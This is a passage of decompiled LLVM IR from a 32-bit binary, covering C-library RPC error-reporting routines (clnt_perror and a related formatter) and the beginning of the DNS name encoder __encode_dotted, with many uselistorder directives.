  %v5_8067021 = inttoptr i32 %v2_8067019 to i8*
  %v5_8067022 = call i32 @strcpy(i8* %v5_8067021, i32 %v0_8067017)
  %v0_8067027 = load i32, i32* @ebx, align 4
  %v4_8067027 = inttoptr i32 %v0_8067027 to i8*
  %v3_806702a = call i32 @strlen(i8* %v4_8067027)
  %v0_8067032 = load i32, i32* @ebx, align 4
  %v2_8067032 = add i32 %v0_8067032, %v3_806702a
  store i32 %v2_8067032, i32* @esi, align 4
  br label %dec_label_pc_8067082

dec_label_pc_8067037:                             ; preds = %dec_label_pc_8066fff
  %v4_8067045 = call i32 @sprintf(i32 %v2_8067019, i32 ptrtoint ([36 x i8]* @global_var_806e43c.865 to i32))
  %v0_806704a = load i32, i32* @ebx, align 4
  %v2_806704a = add i32 %v0_806704a, %v4_8067045
  br label %dec_label_pc_806707f

dec_label_pc_806704f:                             ; preds = %dec_label_pc_8066f45, %dec_label_pc_8066f45
  br label %dec_label_pc_8067077

dec_label_pc_8067064:                             ; preds = %dec_label_pc_8066f45
  br label %dec_label_pc_8067077

dec_label_pc_8067077:                             ; preds = %dec_label_pc_806704f, %dec_label_pc_8066faf, %dec_label_pc_8067064
  %v0_8067077 = phi i32 [ %v2_8066f98, %dec_label_pc_806704f ], [ %v0_8067077.pre, %dec_label_pc_8066faf ], [ %v2_8066f98, %dec_label_pc_8067064 ]
  %v2_8067078 = phi i8* [ getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_806e40b.866, i32 0, i32 0), %dec_label_pc_806704f ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806e3fe.860, i32 0, i32 0), %dec_label_pc_8066faf ], [ getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806e460.867, i32 0, i32 0), %dec_label_pc_8067064 ]
  %v3_8067078 = ptrtoint i8* %v2_8067078 to i32
  %v4_8067078 = call i32 @sprintf(i32 %v0_8067077, i32 %v3_8067078)
  %v0_806707d = load i32, i32* @esi, align 4
  %v3_806707d = add i32 %v0_806707d, %v4_8067078
  br label %dec_label_pc_806707f

dec_label_pc_806707f:                             ; preds = %dec_label_pc_8067037, %dec_label_pc_8067077
  %storemerge = phi i32 [ %v3_806707d, %dec_label_pc_8067077 ], [ %v2_806704a, %dec_label_pc_8067037 ]
  store i32 %storemerge, i32* @esi, align 4
  br label %dec_label_pc_8067082

dec_label_pc_8067082:                             ; preds = %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_8066f45, %dec_label_pc_806701e, %dec_label_pc_806707f
  %v0_8067082 = phi i32 [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8066f98, %dec_label_pc_8066f45 ], [ %v2_8067032, %dec_label_pc_806701e ], [ %storemerge, %dec_label_pc_806707f ]
  %v1_8067082 = inttoptr i32 %v0_8067082 to i8*
  store i8 10, i8* %v1_8067082, align 1
  %v0_8067085 = load i32, i32* @esi, align 4
  %v1_8067085 = add i32 %v0_8067085, 1
  %v2_8067085 = inttoptr i32 %v1_8067085 to i8*
  store i8 0, i8* %v2_8067085, align 1
  br label %dec_label_pc_806708b

dec_label_pc_806708b:                             ; preds = %entry, %dec_label_pc_8067082
  %v0_8067095 = phi i32 [ 0, %entry ], [ %v3_8066f34, %dec_label_pc_8067082 ]
  %v2_8067092 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8067092, i32* @esi, align 4
  store i32 %v0_8066f25, i32* @edi, align 4
  store i32 %v0_8066f24, i32* @ebp, align 4
  ret i32 %v0_8067095

; uselistorder directives
  uselistorder i32 %v1_8066ff7, { 1, 0, 2 }
  uselistorder i32 %v1_8066fee, { 1, 0 }
  uselistorder i32 %v0_8066fff39, { 1, 0 }
  uselistorder i32 %v3_8066f34, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i8 10, { 22, 21, 0, 1, 2, 20, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 12, 13, 14, 15, 64, 0, 71, 16, 70, 58, 45, 44, 72, 17, 10, 11, 1, 2, 3, 4, 5, 6, 7, 60, 9, 8, 65, 55, 18, 19, 54, 20, 21, 53, 22, 23, 52, 24, 25, 51, 26, 27, 50, 28, 29, 49, 30, 31, 48, 32, 33, 47, 34, 35, 46, 36, 37, 38, 39, 56, 40, 61, 62, 63, 41, 66, 57, 67, 68, 69, 42, 59, 43 }
  uselistorder i32 17, { 20, 22, 0, 24, 8, 3, 21, 13, 19, 9, 10, 4, 14, 15, 16, 17, 18, 25, 12, 2, 1, 23, 5, 6, 11, 7 }
  uselistorder i32 16, { 131, 380, 381, 329, 328, 39, 330, 331, 183, 382, 72, 390, 73, 74, 75, 181, 383, 11, 12, 172, 173, 174, 175, 332, 391, 392, 176, 13, 14, 15, 384, 40, 415, 416, 417, 0, 41, 339, 340, 341, 342, 343, 344, 351, 345, 346, 347, 348, 349, 350, 352, 353, 354, 355, 356, 357, 358, 360, 361, 362, 177, 178, 179, 180, 76, 105, 146, 147, 385, 182, 111, 116, 128, 184, 185, 186, 386, 187, 188, 189, 190, 191, 387, 148, 48, 129, 29, 149, 150, 112, 151, 152, 113, 153, 154, 155, 156, 157, 158, 159, 388, 389, 77, 133, 134, 78, 192, 193, 194, 195, 196, 197, 418, 333, 334, 335, 336, 393, 394, 395, 396, 397, 398, 399, 400, 422, 79, 80, 132, 81, 317, 114, 198, 378, 199, 430, 419, 420, 43, 42, 421, 1, 44, 117, 200, 201, 45, 202, 203, 106, 204, 205, 206, 46, 363, 364, 107, 82, 16, 359, 83, 160, 161, 162, 115, 163, 84, 166, 164, 165, 38, 170, 167, 168, 169, 37, 171, 85, 441, 365, 366, 367, 368, 369, 370, 337, 338, 371, 372, 373, 374, 401, 402, 403, 404, 405, 406, 2, 407, 408, 409, 410, 411, 47, 412, 413, 118, 414, 423, 424, 425, 375, 17, 222, 207, 208, 437, 438, 439, 440, 209, 210, 211, 212, 426, 427, 428, 429, 434, 435, 436, 3, 213, 214, 379, 30, 31, 32, 33, 215, 18, 433, 19, 4, 216, 20, 217, 218, 219, 220, 21, 221, 22, 431, 442, 432, 23, 223, 224, 137, 135, 136, 138, 24, 139, 25, 140, 141, 5, 26, 142, 143, 27, 225, 28, 226, 227, 228, 229, 230, 6, 231, 234, 119, 120, 232, 233, 235, 7, 236, 237, 86, 238, 87, 239, 89, 240, 88, 241, 90, 242, 91, 243, 60, 61, 8, 9, 58, 59, 56, 57, 54, 55, 49, 50, 51, 52, 53, 144, 145, 244, 245, 246, 108, 247, 250, 65, 62, 63, 64, 248, 249, 251, 254, 66, 67, 68, 252, 253, 255, 256, 257, 109, 258, 121, 259, 260, 261, 262, 263, 34, 35, 264, 265, 266, 267, 268, 269, 270, 104, 271, 272, 273, 10, 122, 274, 275, 276, 92, 277, 278, 69, 279, 36, 280, 70, 281, 93, 282, 283, 284, 285, 286, 94, 287, 288, 289, 290, 291, 95, 292, 293, 294, 96, 295, 97, 296, 297, 298, 299, 98, 300, 123, 124, 125, 126, 301, 302, 303, 304, 305, 99, 306, 127, 307, 308, 309, 310, 100, 311, 312, 313, 314, 315, 101, 316, 318, 71, 319, 320, 321, 322, 323, 324, 325, 326, 327, 102, 376, 103, 377, 130, 110 }
  uselistorder i32 15, { 8, 3, 16, 10, 2, 17, 9, 35, 37, 5, 0, 20, 4, 11, 12, 13, 14, 15, 18, 19, 6, 21, 22, 23, 24, 1, 25, 26, 27, 28, 7, 29, 30, 31, 32, 33, 34, 36 }
  uselistorder i32 14, { 5, 0, 7, 8, 9, 10, 2, 3, 6, 4, 1 }
  uselistorder i32 13, { 7, 2, 1, 9, 8, 3, 0, 5, 6, 10, 4 }
  uselistorder i32 12, { 73, 7, 267, 268, 248, 249, 250, 0, 251, 41, 121, 42, 43, 271, 82, 113, 114, 115, 116, 252, 117, 8, 293, 294, 272, 295, 296, 297, 298, 299, 300, 61, 60, 14, 254, 15, 16, 17, 18, 19, 20, 21, 9, 118, 119, 120, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 273, 5, 269, 270, 122, 123, 126, 44, 127, 124, 125, 128, 22, 23, 129, 130, 45, 131, 46, 132, 133, 47, 134, 48, 135, 49, 136, 50, 137, 138, 139, 274, 140, 75, 141, 99, 24, 25, 26, 101, 27, 28, 102, 29, 30, 100, 275, 276, 277, 62, 76, 77, 55, 51, 142, 143, 144, 253, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 324, 74, 145, 264, 265, 146, 147, 335, 336, 337, 338, 339, 340, 341, 327, 328, 329, 330, 331, 332, 333, 334, 301, 319, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 63, 318, 64, 148, 10, 56, 149, 150, 151, 255, 256, 257, 258, 152, 54, 227, 103, 104, 105, 106, 107, 108, 109, 110, 111, 353, 259, 289, 1, 2, 290, 291, 31, 32, 292, 3, 260, 261, 65, 71, 161, 52, 153, 352, 154, 325, 349, 155, 266, 323, 156, 11, 12, 13, 326, 321, 322, 320, 342, 343, 344, 157, 158, 159, 354, 66, 72, 345, 346, 347, 348, 350, 6, 351, 160, 162, 112, 163, 164, 53, 78, 79, 80, 81, 166, 165, 4, 67, 68, 167, 168, 169, 170, 171, 172, 173, 174, 35, 34, 33, 175, 36, 176, 38, 37, 177, 178, 179, 180, 181, 182, 57, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 39, 202, 203, 204, 40, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 58, 222, 223, 224, 225, 226, 59, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 69, 245, 246, 247, 262, 263, 70 }
  uselistorder i32 11, { 18, 26, 27, 9, 30, 10, 20, 1, 5, 8, 19, 31, 11, 4, 22, 2, 28, 29, 0, 12, 6, 23, 24, 7, 21, 16, 17, 15, 14, 13, 3, 25 }
  uselistorder i32 10, { 51, 38, 4, 86, 87, 88, 89, 90, 91, 39, 5, 92, 53, 55, 31, 93, 24, 23, 40, 6, 52, 84, 25, 94, 41, 7, 63, 64, 42, 50, 32, 8, 19, 9, 65, 66, 68, 67, 10, 20, 26, 22, 56, 12, 13, 21, 57, 11, 58, 59, 14, 60, 61, 15, 62, 2, 3, 28, 29, 1, 16, 0, 17, 30, 36, 27, 46, 54, 47, 45, 44, 43, 37, 33, 69, 70, 34, 18, 71, 72, 35, 73, 74, 75, 76, 77, 78, 79, 48, 80, 81, 82, 83, 85, 49 }
  uselistorder i32 9, { 15, 30, 31, 32, 33, 34, 0, 1, 17, 6, 35, 36, 3, 16, 2, 8, 7, 18, 37, 38, 39, 40, 41, 19, 20, 21, 5, 9, 4, 13, 12, 11, 22, 23, 24, 25, 26, 27, 10, 14, 28, 29 }
  uselistorder i32 7, { 14, 29, 30, 0, 1, 27, 21, 15, 8, 2, 9, 22, 23, 24, 25, 26, 4, 16, 32, 33, 34, 35, 10, 17, 5, 6, 28, 11, 18, 19, 20, 3, 12, 7, 31, 13 }
  uselistorder i32 6, { 24, 52, 53, 32, 33, 2, 34, 3, 30, 16, 54, 55, 0, 9, 25, 22, 23, 17, 58, 4, 5, 8, 31, 56, 57, 6, 1, 7, 35, 10, 11, 26, 27, 28, 29, 18, 19, 21, 36, 20, 37, 38, 39, 12, 40, 41, 13, 42, 43, 44, 45, 46, 47, 14, 48, 15, 49, 50, 51 }
  uselistorder i32 5, { 36, 50, 39, 47, 48, 49, 15, 16, 51, 43, 44, 22, 37, 17, 41, 42, 23, 18, 38, 28, 29, 45, 30, 1, 53, 54, 31, 25, 2, 3, 4, 5, 19, 52, 26, 46, 20, 21, 0, 40, 6, 7, 8, 27, 32, 33, 34, 35, 9, 10, 24, 11, 12, 13, 14 }
  uselistorder i32 3, { 103, 125, 126, 127, 128, 129, 130, 30, 12, 13, 136, 14, 117, 118, 15, 131, 55, 17, 16, 7, 31, 119, 104, 56, 112, 113, 134, 135, 50, 57, 8, 58, 102, 32, 63, 105, 0, 64, 65, 66, 67, 68, 69, 137, 33, 34, 70, 49, 120, 121, 59, 4, 5, 3, 60, 9, 1, 29, 114, 115, 10, 116, 28, 19, 20, 18, 21, 22, 23, 24, 25, 61, 132, 62, 133, 35, 36, 26, 27, 71, 37, 38, 72, 2, 73, 39, 106, 74, 6, 40, 75, 76, 77, 78, 79, 109, 110, 111, 51, 52, 53, 122, 123, 41, 80, 124, 81, 82, 83, 84, 42, 85, 86, 43, 87, 88, 44, 89, 107, 90, 45, 91, 54, 92, 93, 94, 46, 95, 96, 47, 97, 98, 48, 99, 108, 100, 101, 11 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 8, 3, 4, 5, 6, 7, 9, 10, 11, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 21, 22 }
  uselistorder i32 (i32)* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 21, 23, 20, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 8, { 26, 130, 126, 195, 172, 194, 340, 339, 341, 27, 28, 342, 343, 344, 345, 346, 347, 1, 348, 185, 197, 173, 174, 175, 2, 176, 177, 349, 350, 351, 94, 384, 412, 413, 414, 415, 416, 417, 418, 419, 97, 39, 40, 41, 42, 98, 43, 44, 45, 99, 46, 100, 47, 101, 102, 178, 179, 180, 181, 128, 182, 183, 184, 207, 374, 375, 186, 187, 188, 189, 190, 3, 191, 192, 193, 196, 421, 198, 48, 49, 199, 420, 200, 201, 202, 203, 204, 205, 206, 376, 79, 208, 209, 377, 378, 210, 211, 212, 213, 131, 214, 215, 379, 140, 50, 51, 141, 52, 53, 103, 54, 142, 55, 56, 143, 144, 380, 381, 382, 383, 132, 95, 145, 146, 147, 216, 217, 352, 385, 386, 387, 388, 389, 390, 96, 391, 392, 393, 456, 457, 498, 80, 499, 81, 127, 458, 57, 218, 370, 371, 219, 220, 477, 478, 479, 480, 481, 482, 483, 4, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 5, 422, 423, 424, 425, 426, 427, 105, 6, 106, 7, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 104, 445, 446, 8, 447, 448, 449, 450, 9, 451, 221, 58, 29, 30, 222, 223, 31, 353, 354, 32, 33, 12, 323, 324, 148, 149, 151, 152, 150, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 82, 10, 168, 169, 496, 355, 356, 357, 34, 35, 129, 394, 395, 396, 397, 399, 400, 401, 398, 402, 403, 404, 405, 59, 60, 406, 407, 408, 409, 410, 411, 36, 459, 460, 461, 358, 359, 360, 361, 267, 268, 362, 491, 251, 318, 83, 224, 225, 226, 227, 228, 485, 229, 492, 493, 494, 495, 230, 231, 232, 233, 462, 463, 464, 489, 490, 373, 234, 486, 170, 235, 236, 455, 238, 239, 171, 452, 453, 454, 372, 237, 240, 466, 484, 241, 242, 243, 244, 245, 319, 497, 246, 247, 487, 488, 465, 248, 249, 250, 253, 254, 255, 256, 252, 257, 133, 134, 135, 136, 137, 258, 259, 61, 37, 107, 108, 109, 110, 111, 112, 62, 113, 114, 84, 260, 261, 262, 263, 264, 85, 265, 266, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 86, 279, 138, 69, 68, 66, 67, 63, 64, 65, 139, 115, 116, 87, 88, 280, 281, 70, 92, 71, 282, 283, 24, 89, 284, 73, 72, 93, 74, 285, 286, 117, 25, 90, 287, 0, 288, 289, 290, 291, 13, 292, 14, 15, 118, 91, 293, 11, 294, 295, 296, 297, 38, 298, 299, 300, 75, 120, 76, 301, 302, 16, 303, 119, 304, 305, 77, 121, 78, 306, 307, 308, 17, 309, 310, 311, 18, 312, 313, 314, 315, 316, 317, 19, 320, 321, 322, 122, 325, 326, 20, 327, 328, 329, 21, 330, 331, 22, 332, 333, 334, 23, 335, 336, 123, 337, 338, 124, 363, 364, 365, 366, 125, 367, 368, 369 }
  uselistorder i32 4, { 250, 403, 341, 712, 713, 649, 650, 651, 645, 643, 644, 646, 647, 648, 66, 4, 652, 653, 654, 655, 656, 657, 658, 659, 660, 93, 404, 405, 714, 715, 153, 388, 294, 5, 6, 408, 538, 7, 8, 9, 342, 343, 344, 345, 346, 347, 10, 348, 349, 350, 351, 11, 12, 13, 14, 15, 738, 739, 740, 741, 742, 743, 16, 661, 352, 353, 721, 722, 777, 176, 778, 779, 780, 781, 782, 783, 784, 17, 786, 785, 662, 663, 664, 665, 666, 667, 187, 668, 672, 673, 674, 193, 94, 675, 676, 677, 678, 95, 96, 97, 194, 98, 99, 100, 101, 680, 102, 681, 195, 103, 196, 197, 354, 355, 356, 357, 358, 359, 360, 361, 295, 67, 296, 68, 297, 69, 298, 70, 723, 362, 57, 716, 717, 718, 719, 154, 18, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 727, 728, 729, 385, 386, 387, 724, 725, 726, 389, 390, 391, 392, 393, 394, 395, 396, 410, 397, 398, 399, 19, 400, 401, 402, 406, 407, 788, 409, 411, 412, 104, 105, 413, 787, 720, 414, 415, 416, 417, 730, 731, 418, 419, 420, 421, 422, 423, 251, 424, 732, 733, 734, 106, 107, 299, 300, 301, 71, 302, 108, 303, 109, 198, 110, 111, 304, 112, 305, 306, 307, 308, 735, 736, 155, 242, 737, 261, 260, 262, 263, 264, 177, 425, 426, 427, 428, 429, 430, 789, 20, 669, 670, 671, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 178, 754, 817, 755, 820, 821, 0, 860, 861, 862, 822, 156, 252, 614, 615, 616, 617, 618, 619, 823, 21, 431, 432, 433, 434, 435, 199, 699, 700, 701, 188, 702, 703, 704, 705, 436, 437, 438, 439, 440, 189, 22, 441, 442, 830, 855, 833, 840, 841, 842, 843, 844, 23, 834, 835, 836, 837, 838, 1, 839, 831, 832, 790, 24, 791, 172, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 58, 812, 813, 815, 814, 25, 856, 854, 620, 621, 200, 443, 444, 445, 446, 72, 73, 113, 447, 74, 682, 683, 157, 684, 685, 686, 687, 75, 26, 76, 448, 449, 450, 114, 115, 116, 679, 158, 77, 580, 577, 578, 579, 173, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 324, 322, 323, 79, 326, 325, 78, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 859, 27, 688, 484, 756, 28, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 117, 118, 254, 80, 774, 775, 776, 689, 29, 690, 179, 691, 492, 493, 494, 180, 181, 81, 495, 496, 692, 693, 470, 573, 826, 827, 451, 452, 453, 454, 455, 201, 456, 846, 847, 849, 848, 850, 457, 458, 819, 818, 337, 30, 31, 32, 857, 858, 459, 460, 461, 824, 825, 853, 706, 708, 82, 83, 84, 707, 462, 816, 845, 159, 463, 464, 160, 465, 466, 467, 85, 86, 709, 87, 471, 468, 851, 852, 469, 828, 829, 338, 339, 88, 472, 473, 710, 474, 475, 265, 266, 33, 267, 268, 269, 270, 271, 272, 273, 274, 275, 34, 276, 253, 89, 476, 477, 478, 90, 91, 120, 121, 119, 122, 123, 479, 35, 480, 36, 37, 38, 39, 481, 202, 243, 203, 244, 204, 245, 40, 482, 205, 206, 207, 124, 483, 208, 209, 485, 486, 487, 2, 161, 162, 41, 42, 488, 210, 489, 490, 491, 497, 211, 498, 212, 499, 500, 501, 502, 503, 504, 213, 246, 214, 505, 506, 217, 277, 278, 218, 279, 280, 53, 281, 282, 216, 283, 284, 139, 140, 137, 138, 285, 286, 136, 287, 134, 135, 288, 289, 133, 130, 290, 131, 132, 291, 247, 292, 125, 293, 126, 127, 128, 215, 129, 507, 508, 182, 509, 183, 43, 44, 510, 511, 512, 513, 141, 514, 248, 515, 174, 516, 142, 184, 517, 144, 219, 143, 518, 249, 519, 175, 520, 145, 185, 220, 521, 255, 522, 523, 163, 3, 524, 525, 186, 190, 191, 221, 222, 223, 224, 54, 225, 226, 55, 227, 228, 164, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 59, 45, 629, 46, 92, 229, 230, 537, 146, 147, 539, 231, 232, 233, 234, 56, 235, 236, 237, 540, 541, 542, 148, 149, 543, 544, 545, 546, 547, 47, 150, 548, 60, 549, 550, 551, 256, 553, 552, 165, 554, 555, 556, 557, 48, 151, 558, 61, 559, 560, 561, 257, 563, 562, 166, 564, 565, 566, 567, 568, 49, 569, 62, 570, 167, 571, 572, 50, 152, 574, 63, 575, 168, 576, 581, 582, 583, 584, 585, 586, 587, 588, 258, 590, 589, 169, 591, 592, 593, 594, 64, 595, 596, 597, 598, 599, 600, 170, 601, 602, 603, 604, 605, 606, 607, 259, 609, 608, 171, 610, 611, 612, 613, 192, 622, 623, 624, 625, 626, 627, 628, 630, 631, 632, 633, 634, 635, 636, 637, 638, 238, 639, 640, 641, 239, 642, 694, 240, 695, 696, 697, 241, 698, 65, 51, 711, 52, 340 }
  uselistorder i32* @ebp, { 52, 53, 28, 4, 29, 30, 31, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 45, 5, 46, 47, 48, 363, 364, 365, 395, 396, 366, 367, 368, 397, 398, 399, 400, 250, 251, 257, 258, 259, 260, 270, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 348, 349, 350, 351, 352, 353, 62, 63, 49, 50, 51, 54, 55, 56, 401, 402, 403, 57, 58, 59, 6, 60, 61, 23, 24, 354, 355, 356, 357, 358, 359, 360, 361, 362, 369, 370, 371, 372, 373, 374, 418, 419, 420, 421, 422, 423, 445, 446, 212, 213, 214, 64, 65, 66, 67, 68, 335, 336, 424, 430, 431, 432, 433, 425, 426, 427, 428, 429, 404, 405, 406, 407, 408, 409, 410, 411, 416, 412, 413, 414, 415, 2, 417, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 91, 92, 93, 94, 95, 96, 97, 98, 3, 99, 261, 262, 263, 268, 264, 265, 266, 267, 269, 205, 206, 207, 208, 7, 209, 375, 8, 376, 377, 378, 379, 380, 381, 252, 1, 253, 254, 255, 256, 282, 283, 284, 285, 286, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 0, 394, 25, 26, 27, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 300, 299, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 341, 342, 343, 139, 315, 316, 317, 100, 101, 102, 103, 104, 105, 106, 117, 202, 434, 435, 436, 9, 437, 438, 439, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 440, 441, 442, 443, 444, 118, 119, 120, 337, 338, 339, 340, 13, 14, 15, 16, 17, 18, 19, 20, 21, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 10, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 22, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 217, 218, 219, 193, 194, 195, 196, 197, 198, 199, 200, 201, 203, 204, 210, 211, 215, 216, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 318, 319, 320, 321, 322, 323, 324, 325, 326, 11, 327, 328, 329, 330, 12, 331, 332, 333, 334, 344, 345, 447, 346, 347 }
  uselistorder label %dec_label_pc_806708b, { 1, 0 }
  uselistorder label %dec_label_pc_8067082, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_806707f, { 1, 0 }
  uselistorder label %dec_label_pc_8067077, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066fff, { 1, 0 }
  uselistorder label %dec_label_pc_8066fee, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8067096 = load i32, i32* @ebx, align 4
  %v0_806709a = load i32, i32* @global_var_8074610, align 16
  store i32 %v0_806709a, i32* @ebx, align 4
  %v2_80670a8 = call i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2)
  %v0_80670ad = load i32, i32* @ebx, align 4
  store i32 %v0_8067096, i32* @ebx, align 4
  %v2_80670b9 = call i32 @__GI_fputs(i32 %v2_80670a8, i32 %v0_80670ad)
  ret i32 %v2_80670b9

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 6, 5, 4, 3, 1, 2, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80670c1 = load i32, i32* @edi, align 4
  %v0_80670c2 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80670c9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80670c9, i32* @edi, align 4
  %v1_80671284 = icmp eq i8* %arg1, null
  br i1 %v1_80671284, label %dec_label_pc_8067131, label %dec_label_pc_806712c.lr.ph

dec_label_pc_806712c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_806712c

dec_label_pc_80670cf:                             ; preds = %dec_label_pc_806712c
  %v5_80670d4 = call i32 @__GI_strchr(i8* %v1_806712c, i32 46)
  %v1_80670de = icmp eq i32 %v5_80670d4, 0
  br i1 %v1_80670de, label %dec_label_pc_80670e8, label %dec_label_pc_80670e2

dec_label_pc_80670e2:                             ; preds = %dec_label_pc_80670cf
  %v1_80670e4 = load i32, i32* @edi, align 4
  %v2_80670e4 = sub i32 %v5_80670d4, %v1_80670e4
  br label %dec_label_pc_80670f6

dec_label_pc_80670e8:                             ; preds = %dec_label_pc_80670cf
  %v0_80670eb = load i32, i32* @edi, align 4
  %v5_80670eb = inttoptr i32 %v0_80670eb to i8*
  %v3_80670ec = call i32 @strlen(i8* %v5_80670eb)
  br label %dec_label_pc_80670f6

dec_label_pc_80670f6:                             ; preds = %dec_label_pc_80670e2, %dec_label_pc_80670e8
  %v0_8067109 = phi i32 [ %v3_80670ec, %dec_label_pc_80670e8 ], [ %v2_80670e4, %dec_label_pc_80670e2 ]
  store i32 %v0_8067109, i32* @esi, align 4
  %v1_80670f6 = icmp eq i32 %v0_8067109, 0
  %v3_80670f6 = trunc i32 %v0_8067109 to i8
  br i1 %v1_80670f6, label %dec_label_pc_8067145, label %dec_label_pc_80670fa

dec_label_pc_80670fa:                             ; preds = %dec_label_pc_80670f6
  %v1_80670fe = load i32, i32* %ebx.global-to-local, align 4
  %v2_80670fe = sub i32 %arg3, %v1_80670fe
  %v1_8067100 = add i32 %v2_80670fe, -1
  %v7_8067101 = icmp ult i32 %v0_8067109, %v1_8067100
  %v1_8067103 = icmp eq i1 %v7_8067101, false
  br i1 %v1_8067103, label %dec_label_pc_8067145, label %dec_label_pc_8067105

dec_label_pc_8067105:                             ; preds = %dec_label_pc_80670fa
  store i32 %arg2, i32* @edx, align 4
  %v4_806710b = add i32 %v1_80670fe, %arg2
  %v5_806710b = inttoptr i32 %v4_806710b to i8*
  store i8 %v3_80670f6, i8* %v5_806710b, align 1
  %v0_806710e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806710e = add i32 %v0_806710e, 1
  %v0_8067110 = load i32, i32* @edx, align 4
  %v2_8067112 = add i32 %v1_806710e, %v0_8067110
  %v0_8067114 = load i32, i32* @esi, align 4
  %v0_8067115 = load i32, i32* @edi, align 4
  %v2_8067117 = add i32 %v0_8067114, %v1_806710e
  store i32 %v2_8067117, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_8067112 to i16*
  %v7_8067119 = call i32 @memcpy(i16* %tmp29, i32 %v0_8067115, i32 %v0_8067114)
  %v1_8067125 = add i32 %v5_80670d4, 1
  br i1 %v1_80670de, label %dec_label_pc_8067131, label %dec_label_pc_8067128

dec_label_pc_8067128:                             ; preds = %dec_label_pc_8067105
